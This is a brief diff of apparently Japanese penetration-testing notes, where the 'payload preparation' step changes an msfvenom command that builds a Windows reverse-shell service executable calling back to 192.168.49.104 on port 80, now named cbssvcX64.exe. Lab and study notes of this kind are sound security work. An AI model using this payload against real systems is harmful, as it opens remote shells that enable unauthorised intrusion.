@@ -39,5 +39,5 @@ SeTimeZonePrivilege           Change the time zone                 Enabled
 
 - ペイロードの用意
 ```sh
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f exe-service -o [output.exe]
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f exe-service -o cbssvcX64.exe
 ```
